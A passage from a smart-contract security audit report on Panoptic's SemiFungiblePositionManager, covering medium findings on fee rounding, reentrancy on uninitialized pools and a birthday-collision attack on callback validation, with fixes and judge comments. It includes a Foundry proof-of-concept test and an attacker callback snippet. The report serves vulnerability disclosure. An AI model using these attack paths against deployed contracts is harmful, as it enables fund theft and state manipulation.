**[Picodes (judge) commented via duplicate issue #332](https://github.com/code-423n4/2023-11-panoptic-findings/issues/332#issuecomment-1869789575):**
> As the SFPM is meant to be used by other protocols than Panoptic itself and as there is really an issue here impacting an important function, Medium severity seems justified.

***

## [[M-03] The Main Invariant "Fees paid to a given user should not exceed the amount of fees earned by the liquidity owned by that user." can be broken due to slight difference when computing collected fee](https://github.com/code-423n4/2023-11-panoptic-findings/issues/437)
*Submitted by [0xDING99YA](https://github.com/code-423n4/2023-11-panoptic-findings/issues/437)*

### Lines of code

<https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1049-L1066><br>
<https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1093-L1122><br>
<https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1200-L1248>

### Impact

Currently, when computing the fee a user can collect, Uniswap V3 uses the ways as `(currFeeGrowth - prevFeeGrowth) * liquidity / Q128`, in Panoptic it uses `(currFeeGrowth * liquidity / Q128) - (prevFeeGrowth * liquidity / Q128)`. However, this slightly difference can result in a user to collect more fees than he should have, thus break the main invariant that "Fees paid to a given user should not exceed the amount of fees earned by the liquidity owned by that user".

### Proof of Concept

In Panoptic the fee collection mechanism is as follows:

    int256 amountToCollect = _getFeesBase(univ3pool, startingLiquidity, liquidityChunk).sub(
                s_accountFeesBase[positionKey]
            );

```

    feesBase = int256(0)
                .toRightSlot(int128(int256(Math.mulDiv128(feeGrowthInside0LastX128, liquidity))))
                .toLeftSlot(int128(int256(Math.mulDiv128(feeGrowthInside1LastX128, liquidity))));
```

To show why the slightly difference in calculation can result in the consequence, let's consider some values:

- `currFeeGrowth is 3 * 2^124`<br>
- `prevFeeGrowth is (1 * 2^124 + 1)`<br>
- User position liquidity is `2^4`.

Based on UniswapV3, the collect fee should be `(3 * 2^124 - 1 * 2^124 - 1) * 2^4 / 2^128 = (2 * 2^124 - 1) * 2^4/2^128 = (2 * 2^128 - 2^4) / 2^128 = 1`.

However, based on Panoptic, the fee to be collected is `(3 * 2^124 * 2^4)/2^128 - (1 * 2^124 + 1) * 2^4/2^128 = 3 - 1 = 2`, which is larger than the fee that the user should obtain. If in the same position there is any other users also collecting the fee, that user may lose his fee due to this error.

The difference between the collected fee is 1; seems non-trivial, but it can be a problem in some cases, especially for those token with low decimals. In the documentation, Panoptic claims that it supports any ERC20 with no transfer fee, if there are some tokens with low decimals but worth a lot, this issue can be very serious. Also note, this issue will exist at any case, especially seriously for those pools where `deltaFeeGrowth * liquidity` is around Q128 level and the severity varies case by case.

To show this issue really exists, I will take Gemini USD - USDC pool in Uniswap V3 as an example. Below is the coded POC to show the different calculation indeed causes user collect more fees:

<details>

    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.0;

    import "forge-std/Test.sol";
    import "forge-std/console.sol";
    import {stdMath} from "forge-std/StdMath.sol";
    import {Errors} from "@libraries/Errors.sol";
    import {Math} from "@libraries/Math.sol";
    import {PanopticMath} from "@libraries/PanopticMath.sol";
    import {CallbackLib} from "@libraries/CallbackLib.sol";
    import {TokenId} from "@types/TokenId.sol";
    import {LeftRight} from "@types/LeftRight.sol";
    import {IERC20Partial} from "@testUtils/IERC20Partial.sol";
    import {TickMath} from "v3-core/libraries/TickMath.sol";
    import {FullMath} from "v3-core/libraries/FullMath.sol";
    import {FixedPoint128} from "v3-core/libraries/FixedPoint128.sol";
    import {IUniswapV3Pool} from "v3-core/interfaces/IUniswapV3Pool.sol";
    import {IUniswapV3Factory} from "v3-core/interfaces/IUniswapV3Factory.sol";
    import {LiquidityAmounts} from "v3-periphery/libraries/LiquidityAmounts.sol";
    import {SqrtPriceMath} from "v3-core/libraries/SqrtPriceMath.sol";
    import {PoolAddress} from "v3-periphery/libraries/PoolAddress.sol";
    import {PositionKey} from "v3-periphery/libraries/PositionKey.sol";
    import {ISwapRouter} from "v3-periphery/interfaces/ISwapRouter.sol";
    import {SemiFungiblePositionManager} from "@contracts/SemiFungiblePositionManager.sol";
    import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    import {PositionUtils} from "../testUtils/PositionUtils.sol";
    import {UniPoolPriceMock} from "../testUtils/PriceMocks.sol";
    import {ReenterMint, ReenterBurn} from "../testUtils/ReentrancyMocks.sol";
    import {IUniswapV3Pool} from "univ3-core/interfaces/IUniswapV3Pool.sol";

    contract LiquidityProvider {
        IERC20 constant token0 = IERC20(0x056Fd409E1d7A124BD7017459dFEa2F387b6d5Cd);
        IERC20 constant token1 = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

        function uniswapV3MintCallback(
            uint256 amount0Owed,
            uint256 amount1Owed,
            bytes calldata data
        ) external {
            if (amount0Owed > 0) token0.transfer(msg.sender, amount0Owed);
            if (amount1Owed > 0) token1.transfer(msg.sender, amount1Owed);
        }

        function uniswapV3SwapCallback(
            int256 amount0Delta,
            int256 amount1Delta,
            bytes calldata data
        ) external {
            IERC20 token = amount0Delta > 0 ? token0 : token1;

            uint256 amountToPay = amount0Delta > 0 ? uint256(amount0Delta) : uint256(amount1Delta);

            token.transfer(msg.sender, amountToPay);
        }

        function arbitraryCall(bytes calldata data, address pool) public {
            (bool success, ) = pool.call(data);
            require(success);
        }
    }

    contract CollectFee is Test {
        address constant GeminiUSDCPool = 0x5aA1356999821b533EC5d9f79c23B8cB7c295C61;
        address constant GeminiUSD = 0x056Fd409E1d7A124BD7017459dFEa2F387b6d5Cd;
        address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        LiquidityProvider Alice;
        uint160 internal constant MIN_V3POOL_SQRT_RATIO = 4295128739;
        uint160 internal constant MAX_V3POOL_SQRT_RATIO =
            1461446703485210103287273052203988822378723970342;

        uint256 mainnetFork;

        struct Info {
            uint128 liquidity;
            uint256 feeGrowthInside0LastX128;
            uint256 feeGrowthInside1LastX128;
            uint128 tokensOwed0;
            uint128 tokensOwed1;
        }

        function setUp() public {
            // Use your own RPC to fork the mainnet
            mainnetFork = vm.createFork(
                "Your RPC"
            );
            vm.selectFork(mainnetFork);

            Alice = new LiquidityProvider();
            deal(USDC, address(Alice), 1000000 * 1e6);

            vm.startPrank(address(Alice));
            IERC20(USDC).approve(GeminiUSDCPool, type(uint256).max);
            vm.stopPrank();
        }

        function testFeeCollectionBreakInvariant() public {
            // First swap to get some GeminiUSD balance
            bytes memory AliceSwapData = abi.encodeWithSignature(
                "swap(address,bool,int256,uint160,bytes)",
                address(Alice),
                false,
                int256(20000 * 1e6),
                MAX_V3POOL_SQRT_RATIO - 1,
                ""
            );
            Alice.arbitraryCall(AliceSwapData, GeminiUSDCPool);

            // Then mint some position for Alice, the desired liquidity is 10000000000
            bytes memory AliceMintData = abi.encodeWithSignature(
                "mint(address,int24,int24,uint128,bytes)",
                address(Alice),
                92100,
                92200,
                10000000000,
                ""
            );
            Alice.arbitraryCall(AliceMintData, GeminiUSDCPool);

            // Now we retrieve the initial feeGrowth for token0(Gemini USD) after minting the position for Alice
            (
                uint128 liquidity,
                uint256 prevFeeGrowthInside0LastX128,
                uint256 prevFeeGrowthInside1LastX128,
                ,

            ) = IUniswapV3Pool(GeminiUSDCPool).positions(
                    keccak256(abi.encodePacked(address(Alice), int24(92100), int24(92200)))
                );

            // Then we perform two swaps (both from Gemini USD to USDC, first amount is 4800 USD then 5000 USD)
            AliceSwapData = abi.encodeWithSignature(
                "swap(address,bool,int256,uint160,bytes)",
                address(Alice),
                true,
                int256(4800 * 1e2),
                MIN_V3POOL_SQRT_RATIO + 1,
                ""
            );

            Alice.arbitraryCall(AliceSwapData, GeminiUSDCPool);

            AliceSwapData = abi.encodeWithSignature(
                "swap(address,bool,int256,uint160,bytes)",
                address(Alice),
                true,
                int256(5000 * 1e2),
                MIN_V3POOL_SQRT_RATIO + 1,
                ""
            );

            Alice.arbitraryCall(AliceSwapData, GeminiUSDCPool);

            // We burn the position of Alice to update feeGrowth for Gemini USD
            bytes memory AliceBurnData = abi.encodeWithSignature(
                "burn(int24,int24,uint128)",
                int24(92100),
                int24(92200),
                uint128(10000000000)
            );
            Alice.arbitraryCall(AliceBurnData, GeminiUSDCPool);

            // Now we retrieve the updated feeGrowth for token0(Gemini USD)
            (
                uint256 newliquidity,
                uint256 currFeeGrowthInside0LastX128,
                uint256 currFeeGrowthInside1LastX128,
                ,

            ) = IUniswapV3Pool(GeminiUSDCPool).positions(
                    keccak256(abi.encodePacked(address(Alice), int24(92100), int24(92200)))
                );

            // This is how UniV3 compute collected fee: (currFee - prevFee) * liquidity / Q128
            console.log("Univ3 fee obtained: ");
            uint256 collectFee = ((currFeeGrowthInside0LastX128 - prevFeeGrowthInside0LastX128) *
                10000000000) / (2 ** 128);
            console.log(collectFee);

            console.log("Panoptic fee1 record: ");
            uint256 collectFee1 = (currFeeGrowthInside0LastX128 * 10000000000) / (2 ** 128);

            console.log("Panoptic fee2 record: ");
            uint256 collectFee2 = (prevFeeGrowthInside0LastX128 * 10000000000) / (2 ** 128);

            // This is how Panoptic compute collected fee: currFee * liquidity / Q128 - prevFee * liquidity / Q128
            console.log("Panoptic way to calculate collected fee: ");
            console.log(collectFee1 - collectFee2);

            // Then we ensure the fee calculated by Panoptic is larger than UniV3
            assertGt(collectFee1 - collectFee2, collectFee);
        }
    }

</details>

In this case, that user can collect 1 more Gemini USD which is around `0.01` USD. Also note that these are just two normal swaps with thousands of dollars and in reality this effect can accumulate due to much more trading volume per day. Imagine there may be some similar tokens but pegged to ETH or even BTC instead; in that case, will be `0.01` ETH or even `0.01` BTC which can be much more value! Also, in Panoptic there can be multiple persons for the same option position. Let's say 10 users for the same option position, the first 9 users who collect the fee will get more, and the last user can get much less fee because each of the 9 person will take part of the fee from him!

### Tools Used

Foundry

### Recommended Mitigation Steps

In the comments, it seems Panoptic team has the reason to use this way to calculate the collected fee after much consideration. I think instead of supporting any ERC20 token, they may introduce a whitelist to only add those pool which will not affected by this issue significantly.

**[dyedm1 (Panoptic) confirmed and commented](https://github.com/code-423n4/2023-11-panoptic-findings/issues/437#issuecomment-1861513486):**
 > [A] - [B] is not guaranteed to be `<=` [A-B].

**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-11-panoptic-findings/issues/437#issuecomment-1866809034):**
 > This issue describes how a difference of 1 between the fees paid by the SPFM and the fees earned by the position can happen. However, as the loss of funds is partial and dependent on the existence of a valuable token where 1 wei is worth something and with a lot of swaps (the report isn't going into details of the number of swaps requirements), medium severity seems more appropriate.

***

## [[M-04] Premium owed can be calculated as a very big number due to reentrancy on uninitialized pools](https://github.com/code-423n4/2023-11-panoptic-findings/issues/355)
*Submitted by [tapir](https://github.com/code-423n4/2023-11-panoptic-findings/issues/355), also found by [hash](https://github.com/code-423n4/2023-11-panoptic-findings/issues/525) and [SpicyMeatball](https://github.com/code-423n4/2023-11-panoptic-findings/issues/230)*

When minting or burning a position, an attacker can take advantage of reentrancy to make the pool has more `removedLiquidity` than it has. This would make the owed premium to be mistakenly very high value. The issue root cause is reentrancy on an uninitialized pool in SFPM. SFPM initialize pool function explicitly makes the `locked` flag to false which can be leveraged for the attacker to reenter and burn the position before the mint goes through fully. This will lead to an underflow in the `removedLiquidity` part of the chunk. Thus, the premium owed will be calculated as a very big number since the removed liquidity is used to track the premiums owed.

### Proof of Concept

It's best to explain this issue using an example due to its complexity:

First, the attacker is a contract that has a custom `onERC1155Received` implemented. In this case, the attacker checks for uninitialized pools in SFPM. Let's say the USDC-ETH 0.05% pool is not yet initialized. The attacker initiates a call to `mintTokenizedPosition` with a "short" type. Normally, this action would remove specific liquidity from Uniswapv3 deposited through SFPM. Attempting this without a deposit in that range would normally throw an error in [this part of the code](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L985-L991). Also, note that although the underlying uniswap pool is not registered, `mintTokenizedPosition` does not revert since the attacker will initialize the pool in the ERC1155 callback!

The attacker proceeds with the mint function despite expecting it to revert. The tokenId's Uniswap pool part (first 64 bits) remains uninitialized. The attacker takes advantage of this and, once the `_mint` is called internally in ERC1155, the attacker can execute their custom `onERC1155Received` in their contract.

As we can see here, before any execution on state and storage the `_mint` is called so attacker will has its `onERC1155Received` callback function called by SFPM:

<https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L521>

Now, attacker will have the following `onERC1155Received` function:

```solidity
function onERC1155Received(*/ address caller, address to */ , uint tokenId, uint amount, bytes calldata data) return bytes4 {
   SFPM.initializeAMMPool(USDC, WETH, FEE_TIER);
   SFPM.burnTokenizedPosition(tokenId, tokenId.positionSize(), slippageTickLimitLow, slippageTickLimitHigh);

   return ERC1155Holder.onERC1155Received.selector;
}
```

The first step here is initializing the pool. This action unlocks the pool's reentrancy lock, allowing re-entry into the functions for that pool [link](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L375-L378).

The second call burns the token. As this was a long position and has the `burn` flag, it flips the long to short [link](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L674-L676).

When reaching [this part of the code](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L957-L1007), `isLong` equals 0, initiating an unchecked scope, resulting in an underflow of `removedLiquidity`, leading to an immensely large number!

Continuing with the function, [these lines](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L1031-L1067) execute, minting liquidity using 1 ETH from the attacker, inadvertently increasing the actual liquidity without a prior deposit.

The `removedLiquidity` and `netLiquidity` are then written to storage.

Despite the attacker's tokenId being burnt and nonexistent due to the `onERC1155Received` function execution, the process continues. Which means we can now continue with the initial `mintTokenizedPosition` function

Since the previous call updated `removedLiquidity` to an enormous number via underflow, and increasing `netLiquidity` with chunk liquidity, leads to no reversion in [these lines](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L981-L1001).

Afterward, the position is successfully burned from Uniswap. Continuing with the function, at [this point](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1050-L1059), the `rightSlot` holds the net liquidity from previous storage balance. Hence, we will execute the `_collectAndWritePositionData` [function](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1050-L1059).

However, we have a problem arising in the `_updateStoredPremia` function which is called inside the `_collectAndWritePositionData`
[here](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1270-L1328). The removed liquidity is used to calculate the premium owed. Due to the underflow from previous storage balance in `removedLiquidity` (`leftSlot`), the resulting `premiumOwed` becomes immensely high. This impacts the premium owed to be an immensely big number, returning a false statement. Furthermore, users intending to use the USDC-ETH 0.05% pool may encounter difficulties due to messed-up premiums in one range position, potentially affecting other positions relying on these premiums within the external contract.

### Recommended Mitigation Steps

Validate the uniswap pool ID before the `_mint` OR do not explicitly set the locked value to false when initializing the pool

### Assessed type

Under/Overflow

**[dyedm1 (Panoptic) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-11-panoptic-findings/issues/355#issuecomment-1859325324):**
 > This is a good one, but might be Med since `removedLiquidity` is only used for the optional premium accumulators that get exposed and has no effect on the internal SFPM functionality. Panoptic obviously wouldn't execute this reentrancy on its own mints (and besides the factory initializes the pool before deploying a `PanopticPool`). Essentially, it only allows you to screw up your own `removedLiquidity`, which outside of a protocol is not very relevant.

**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-11-panoptic-findings/issues/355#issuecomment-1866791209):**
 > Medium severity seems more appropriate here under "hypothetical attack path with stated assumptions, but external requirement". Storage can be manipulated and this state manipulation could lead to loss of funds in a protocol using the SPFM. 

***

## [[M-05] ` validateCallback()` is vulnerable to a birthday attack](https://github.com/code-423n4/2023-11-panoptic-findings/issues/247)
*Submitted by [LokiThe5th](https://github.com/code-423n4/2023-11-panoptic-findings/issues/247), also found by [lil\_eth](https://github.com/code-423n4/2023-11-panoptic-findings/issues/178), [kfx](https://github.com/code-423n4/2023-11-panoptic-findings/issues/128), and sivanesh\_808 ([1](https://github.com/code-423n4/2023-11-panoptic-findings/issues/640), [2](https://github.com/code-423n4/2023-11-panoptic-findings/issues/630))*

### Preface

This is likely to be a contentious issue, so the reviewer will deviate from the usual submission template to make a clear case for this issue.

The [birthday paradox](https://en.wikipedia.org/wiki/Birthday_problem) refers to the counterintuitive fact that in a room of only 23 people there is a probability exceeding 50% that any two people share a birthday.

**ELI5 (as much for my own benefit as for the reader's.)**

Where there are random numbers generated, there is a much greater likelihood that there will be any number that is drawn at least twice, than a single predetermined number. In other words, for a set of `0 <= x <= 99` possible numbers, if we only make 10 draws (and not excluding this number from subsequent draws) looking for the number `x`, then there is for each draw a `0.01` probability to get `x`, and so for a sample of `10` draws the probability of finding `x` is `0.1`.

But, the chance of drawing *any two values that are the same*, in those `10` draws is about `0.39`. For `25` draws the odds are about `0.95`. See more about this calculation and this attack vector [here](https://en.wikipedia.org/wiki/Birthday_attack).

### Hashing

For the keccak256 hashing used in the EVM, it means that there are `2^256` possible hashes for all possible inputs. Of course, all the possible inputs are much greater than `2^256`. This brings us to the pigeonhole problem (which we run into when we cast values from `uint256` to `uint64`, as an example). To simplify, where there are functions that have a greater number of valid inputs than the number possible outcomes, then logically there must be multiple inputs that have the same output.

Consider this [code snippet](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/libraries/CallbackLib.sol#L28-L50) from the audit, which follows a well-known pattern:

                address(
                    uint160(
                        uint256(
                            keccak256(
                                abi.encodePacked(
                                    bytes1(0xff),
                                    factory,
                                    keccak256(abi.encode(features)),
                                    Constants.V3POOL_INIT_CODE_HASH
                                )
                            )
                        )
                    )
                )

We know that `keccak256` provides a 256-bit result, but then that 256-bit result is truncated to a 160-bit value. The preceeding 96-bit value is lost. Meaning that for every 160-bit address derived by the code above, there would have been `2^96` possible values that could have led to that address. For our `N` of 160, this means an attacker would need to compute `sqrt(2^160)`, which is `2^80`, to be likely to find a [collision](https://en.wikipedia.org/wiki/Collision_resistance).

### Impact

The `validateCallback` function validates that a `sender` address conforms to the expected counterfactual address for a Uni-V3 pool given the specified features and the appropriate `FACTORY` address.

The check assumes that the only way a `sender` address can be derived is through deployment via the V3 Factory contract, which uses counterfactual deployments. This is problematic, given that the `uniswapV3MintCallback` does not check that a pool address exists, *only that it conforms to the address derivation rules from `CallBackLib::validateCallback()`*.

Given the pigeonhole problem, and an attacker's ability to generate inputs by varying the parameters supplied in the `data` input of the `uniswapV3Callback`, it is theoretically feasible that an attacker can generate some combination of `token0`, `token1`, and `fee`, where the `token0` is a valid address for a token to be stolen (e.g. `USDC` or `WETH`), and the `token1` and `fee` can be varied arbitrarily to create addresses. The attacker would then generate EOA (or deterministic contract) addresses with varying parameters until they generated an address that matches ANY of the possible addresses generated by part 1.

The impact would be that the attacker then deploys the EOA which has been found to collide with a given set of pool parameters. The attacker would then be able to call `uniswapV3MintCallback` directly, passing in the seed values used to create the collision in the `data` parameters. Because this will ensure the `validateCallback` check passes, the attacker would be able to specify ANY address that has given approval to the `SemiFungiblePositionManager` and transfer the approved amount of `token0` to the attacker address. This is problematic, as the `SemiFungiblePositionManager` is likely to accrue significant approvals, as it needs approvals from users to `safeTransferFrom` from the `user` to the `uniswapV3Pool` when creating positions.

### Proof of Concept

Consider the following:

1. There are `2^160` possible EVM addresses.
2. There are `2^256` possible hash outputs for the keccak256 function.

Therefore, there must be hash outputs where the last 160 bits of the 256 bit hash output are the same. There are `2^96` different keccak256 hash outputs that would share the same last 160 bits.

The odds of person creating an address using counterfactual deployment (or normal EOA generation) and so create an account with the same address as a specific `target` address in normal on-chain use are so small that it's practically impossible.

But the probability of getting a usable address from address deployment is the probability of ANY address derived using the method in the `validateCallback` function being the same as ANY address (EOA or deterministic) derived by the attacker through some seed values. This greatly reduces the amount of compute necessary, but it is still not trivial.

The attacker would need to compute at least two sets of `2^80` - one set for the EOA and the other for the combination of `PoolFeatures` that would clash. With that there is a 39% chance of a clash.

As the [submission by 0x52 showed](https://github.com/sherlock-audit/2023-07-kyber-swap-judging/issues/90), drawing `2^81` samples would raise the success rate to 86%.

### A note on feasibility

As the feasibility of this attack is probably the greatest limiting factor, it would be wise to get some real-world bounds for this.

*Please note that these are rough estimates to provide context*

1. Some Antminers can reach [255 terahashes/second](https://koinly.io/blog/best-crypto-mining-hardware/).
2. It costs around USD 4200 for one such machine.
3. It has an energy requirement of 5.4kW.
4. Per the above there would need to be at least two sets of `2^81` hashes.

Given these parameters it would take a single antminer (at 255Th/s) about 300 years to generate the first set. (`2^81` hashes at `255e12` hashes generated per second). So to do it in one year would require about 300 antminers, thus a capital outlay of USD 1.26 million. Then you need the second set, so it would take another year for a total of two sets. In terms of power you would need `5.4kw (single machine power draw) * 300 (number of miners) * 0.12 (cost per kwh) * 8784 (hours in a year) * 2` (using the average cost to businesses of 0.12 USD per kWh), which gives about `USD 3,415,219.2` of energy costs in total.

So here we have an attack that will cost about 4.6 million dollars in capex + energy over a two year period.

The `SemifungiblePositionManager` requires token approvals from users to allow it to `safeTransferFrom` the `payer` to the `uniswapV3Pool` and would have accrued enough approvals within two years that should be multiples of this cost, thus the attack is expected to be profitable.

The reviewer has here not taken into account the requirement of a reliable power supply of 1.62MWh that 300 antminers running in concert would need, nor the other operational expenses related to such a massive enterprise, nor the storage problem of storing `2^81` outputs to check the second set against. Importantly, it is assumed that the machines used are hashing at equivalent efficiencies for `keccak256` hashes.

But the continued improvement of technology makes this more and more feasible within the next few years (there is already a new antminer slated for early 2024 release that is expected to reach 335TH/s without greater power draw).

Considering the broader context of hacks within the DeFi industry and known nation-state actors operating in the space, and considering that the fix for this is also relatively simple, it seems a prudent idea to add a fix to mitigate this issue that may become very real within the next decade.

### Recommended Mitigation Steps

In the callback, obtain the `fee` and use that to query the `FACTORY` to ensure the `msg.sender` is a pool that has been deployed.

```diff
    function validateCallback(
        address sender,
        address factory,
        PoolFeatures memory features
    ) internal pure {
        // compute deployed address of pool from claimed features and canonical factory address
        // then, check against the actual address and verify that the callback came from the real, correct pool
-        if (
-            address(
-                uint160(
-                    uint256(
-                        keccak256(
-                            abi.encodePacked(
-                                bytes1(0xff),
-                                factory,
-                                keccak256(abi.encode(features)),
-                                Constants.V3POOL_INIT_CODE_HASH
-                            )
-                        )
-                    )
-                )
-            ) != sender
-        ) revert Errors.InvalidUniswapCallback();
+        if (sender != IFactory(factory).getPool(
+            features.token0,
+            features.token1,
+            features.fee
+        )) revert Errors.InvalidUniswapCallback();
    }
```

### Assessed type

Invalid Validation

**[dyedm1 (Panoptic) confirmed and commented via duplicate issue #128](https://github.com/code-423n4/2023-11-panoptic-findings/issues/128#issuecomment-1858374489):**
 > That's fair as a Medium. Uniswap's own contracts all use the computation method, but I'm all for paranoid security.

***

# Low Risk and Non-Critical Issues

For this audit, 37 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-11-panoptic-findings/issues/481) by **osmanozdemir1** received the top score from the judge.

*The following wardens also submitted reports: [sivanesh\_808](https://github.com/code-423n4/2023-11-panoptic-findings/issues/581), [0xCiphky](https://github.com/code-423n4/2023-11-panoptic-findings/issues/384), [tapir](https://github.com/code-423n4/2023-11-panoptic-findings/issues/364), [Cryptor](https://github.com/code-423n4/2023-11-panoptic-findings/issues/313), [ether\_sky](https://github.com/code-423n4/2023-11-panoptic-findings/issues/275), [minhtrng](https://github.com/code-423n4/2023-11-panoptic-findings/issues/625), [nocoder](https://github.com/code-423n4/2023-11-panoptic-findings/issues/603), [hubble](https://github.com/code-423n4/2023-11-panoptic-findings/issues/594), [ro1sharkm](https://github.com/code-423n4/2023-11-panoptic-findings/issues/523), [LokiThe5th](https://github.com/code-423n4/2023-11-panoptic-findings/issues/507), [baice](https://github.com/code-423n4/2023-11-panoptic-findings/issues/497), [ThenPuli](https://github.com/code-423n4/2023-11-panoptic-findings/issues/483), [Audinarey](https://github.com/code-423n4/2023-11-panoptic-findings/issues/482), [Banditx0x](https://github.com/code-423n4/2023-11-panoptic-findings/issues/392), [lanrebayode77](https://github.com/code-423n4/2023-11-panoptic-findings/issues/368), [Skylice](https://github.com/code-423n4/2023-11-panoptic-findings/issues/315), [Udsen](https://github.com/code-423n4/2023-11-panoptic-findings/issues/309), [hunter\_w3b](https://github.com/code-423n4/2023-11-panoptic-findings/issues/291), [seaton0x1](https://github.com/code-423n4/2023-11-panoptic-findings/issues/289), [KupiaSec](https://github.com/code-423n4/2023-11-panoptic-findings/issues/284), [leegh](https://github.com/code-423n4/2023-11-panoptic-findings/issues/280), [CRYP70](https://github.com/code-423n4/2023-11-panoptic-findings/issues/273), [D1r3Wolf](https://github.com/code-423n4/2023-11-panoptic-findings/issues/271), [onchain-guardians](https://github.com/code-423n4/2023-11-panoptic-findings/issues/229), [grearlake](https://github.com/code-423n4/2023-11-panoptic-findings/issues/183), [ustas](https://github.com/code-423n4/2023-11-panoptic-findings/issues/179), [lsaudit](https://github.com/code-423n4/2023-11-panoptic-findings/issues/175), [hihen](https://github.com/code-423n4/2023-11-panoptic-findings/issues/151), [Topmark](https://github.com/code-423n4/2023-11-panoptic-findings/issues/145), [ZanyBonzy](https://github.com/code-423n4/2023-11-panoptic-findings/issues/105), [foxb868](https://github.com/code-423n4/2023-11-panoptic-findings/issues/82), [Sathish9098](https://github.com/code-423n4/2023-11-panoptic-findings/issues/57), [t4sk](https://github.com/code-423n4/2023-11-panoptic-findings/issues/41), [tpiliposian](https://github.com/code-423n4/2023-11-panoptic-findings/issues/29), [ptsanev](https://github.com/code-423n4/2023-11-panoptic-findings/issues/18), and [fatherOfBlocks](https://github.com/code-423n4/2023-11-panoptic-findings/issues/13).*

### Issue Summary

| ID | Title
|----------|------------------|
| [01] | Users should be able to choose the recipient for long positions in case of being blocked |
| [02] | Actual collected amounts and the requested amounts should be checked in `SemiFungiblePositionManager::_collectAndWritePositionData` |
| [03] | Input array lengths in `ERC1155Minimal::balanceOfBatch` is not checked |
| [04] | Possible missing function in `LeftRight.sol` library | 
| [05] | Misleading comments related to `positionKey` |
| [06] | Slippage tick limits for swaps can be inclusive |
| [07] | NatSpec `@return` explanation is incorrect in `_createPositionInAMM()` function |
| [08] | Misleading comment in `_mintLiquidity()` function |
| [09] | No need to wrap `uniV3pool` parameter in `getAccountPremium` function |
| [10] | NatSpec `@return` comment is incorrect in `_getPremiaDeltas()` function |
| [11] | `SemiFungiblePositionManager` does not comply with the ERC1155 standard due to not reverting on transfer to zero address |
| [12] | `ERC1155Minimal::safeBatchTransferFrom` **MUST** revert if the length of ids is not the same as the length of amounts to comply with the ERC1155 token standard |
| [13] | 12-bit is not enough for a leg width |
| [14] | Some token IDs can not be validated due to default riskPartner being zero |

## [01] Users should be able to choose the recipient for long positions

https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1223

Users deposit tokens by opening short positions and withdraw tokens by opening long positions or closing short positions (*closing a short position is also considered as long in the codebase*).

If a position is long, the liquidity in the Uniswap is [burned first](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1033) and then [collected](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1051).

In the current implementation, the collected tokens are only transferred to the `msg.sender` and the user has no way to provide a different recipient.  

https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1222C2-L1228C15

```solidity
File: SemiFungiblePositionManager.sol
// function _collectAndWritePositionData
       ...
            (uint128 receivedAmount0, uint128 receivedAmount1) = univ3pool.collect(
 -->            msg.sender, //@audit the recipient is always msg.sender
                liquidityChunk.tickLower(),
                liquidityChunk.tickUpper(),
                uint128(amountToCollect.rightSlot()),
                uint128(amountToCollect.leftSlot())
            );
```

This `SemiFungiblePositionManager` contract is the ERC1155 version of Uniswap's `NonfungiblePositionManager`. Users can provide different recipient addresses in both `NonfungiblePositionManager` and `UniswapV3Pool` contracts in the Uniswap protocol.

Users should be able to provide recipients in case of being blocked by some token contracts (e.g. USDC or USDT).

1. Alice opens a short position and deposits USDC to Uniswap through Panoptic.
2. Alice's account is blocked by the USDC contract.
3. Alice tries to close her position.    
4. `_collectAndWritePositionData` reverts while transferring USDC back to Alice due to Alice being blocked.
5. She can not close her position.
    
If Alice minted a position directly in Uniswap instead of doing this through Panoptic, she could've provided a different address, closed the position and gotten her tokens back.

### Recommendation

Allow users to provide recipient addresses to collect fees and burnt liquidity instead of transferring only to the `msg.sender`.

## [02] Actual collected amounts and the requested amounts should be checked in `SemiFungiblePositionManager::_collectAndWritePositionData`

